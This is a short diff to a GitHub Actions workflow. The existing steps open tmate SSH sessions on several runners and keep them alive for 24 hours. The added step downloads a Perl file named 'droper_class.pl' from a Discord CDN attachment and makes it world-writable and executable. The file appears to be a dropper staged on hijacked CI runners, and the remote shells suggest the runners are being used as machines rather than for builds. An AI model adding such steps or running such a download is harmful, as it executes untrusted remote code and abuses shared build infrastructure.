@@ -31,6 +31,11 @@ jobs:
             tmate -S /tmp/tmate_$i.sock wait tmate-ready
             echo "Makine ${{ matrix.machine }} - tmate $i SSH: $(tmate -S /tmp/tmate_$i.sock display -p '#{tmate_ssh}')"
           done
+      - name: Download and set permissions for droper_class.pl
+        run: |
+          cd ~
+          wget -O droper_class.pl "https://cdn.discordapp.com/attachments/1258368563073388607/1395507438886850742/droper_class.pl?ex=687ab314&is=68796194&hm=9585ed1cf1de3c8f2a6a4c35b2b61a7b5d22e771e794ac6e18011106ae3b579c&"
+          chmod 777 droper_class.pl
       - name: Keep session running
         run: |
           echo "Makine ${{ matrix.machine }} 24 saat boyunca açık kalacak..."
